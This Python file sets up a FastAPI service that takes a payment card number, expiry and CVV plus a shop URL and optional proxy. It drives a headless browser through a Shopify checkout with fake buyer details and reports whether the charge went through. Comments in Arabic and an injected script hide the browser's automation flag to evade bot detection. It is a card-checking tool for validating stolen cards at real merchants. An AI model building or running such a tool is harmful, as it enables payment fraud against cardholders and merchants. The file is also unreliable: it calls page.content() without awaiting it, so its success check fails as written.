from fastapi import FastAPI, Query
from playwright.async_api import async_playwright
import uvicorn

app = FastAPI()

@app.get("/check")
async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
    async with async_playwright() as p:
        # إعدادات متقدمة لتجاوز الحماية مدمجة بدون مكاتب خارجية
        browser = await p.chromium.launch(args=[
            "--no-sandbox", 
            "--disable-dev-shm-usage",
            "--disable-blink-features=AutomationControlled", 
            "--disable-infobars",
            "--window-position=0,0",
            "--ignore-certificate-errors",
        ])
        
        context_args = {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "viewport": {"width": 1280, "height": 720},
            "locale": "en-US",
            "timezone_id": "America/New_York",
        }
        
        if proxy:
            context_args["proxy"] = {"server": proxy}
            
        context = await browser.new_context(**context_args)
        
        # حقن كود لإخفاء خاصية الأتمتة التلقائية بنجاح
        await context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
        """)
        
        page = await context.new_page()
        
        try:
            await page.goto(f"{site}/checkout", timeout=90000, wait_until="load")
            await page.wait_for_selector('input', timeout=30000)
            
            email_field = page.locator('input[type="email"], input[name*="email"], input[placeholder*="Email"]').first
            await email_field.fill("user@example.com")
            
            first_name = page.locator('input[name*="firstName"], input[placeholder*="First name"]').first
            await first_name.fill("John")
            
            last_name = page.locator('input[name*="lastName"], input[placeholder*="Last name"]').first
            await last_name.fill("Doe")
            
            address_field = page.locator('input[name*="address1"], input[placeholder*="Address"]').first
            await address_field.fill("123 Street")
            
            submit_btn = page.locator('button[type="submit"], button:has-text("Continue")').first
            await submit_btn.click()
            await page.wait_for_load_state("domcontentloaded")
            
            try:
                payment_btn = page.locator('button:has-text("Continue to payment"), button[type="submit"]').first
                await payment_btn.click(timeout=10000)
                await page.wait_for_load_state("networkidle", timeout=15000)
            except:
                pass

            iframe_selector = 'iframe[title*="payment"], iframe[title*="Secure card"]'
            await page.wait_for_selector(iframe_selector, timeout=40000)
            frame = page.frame_locator(iframe_selector)
            
            cc_parts = cc.split('|')
            await frame.locator('input[name*="number"]').fill(cc_parts[0])
            await frame.locator('input[name*="expiry"]').fill(f"{cc_parts[1]}/{cc_parts[2]}")
            await frame.locator('input[name*="verification_value"]').fill(cc_parts[3])
            
            final_btn = page.locator('button#continue-button, button:has-text("Pay now"), button[type="submit"]').first
            await final_btn.click()
            
            await page.wait_for_load_state("networkidle", timeout=30000)
            
            content = page.content().lower()
            status = "true" if "thank-you" in page.url or "success" in content else "false"
            
            return {"Gateway": "Shopify Payments", "Response": "CHARGED" if status == "true" else "CARD_DECLINED", "Status": status, "CC": cc}
            
        except Exception as e:
            return {"Gateway": "Shopify Payments", "Response": "FAILED", "Details": str(e), "Status": "false", "CC": cc}
            
        finally:
            # إغلاق المتصفح لضمان عدم امتلاء الذاكرة وكراش الحاوية
            await browser.close()

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
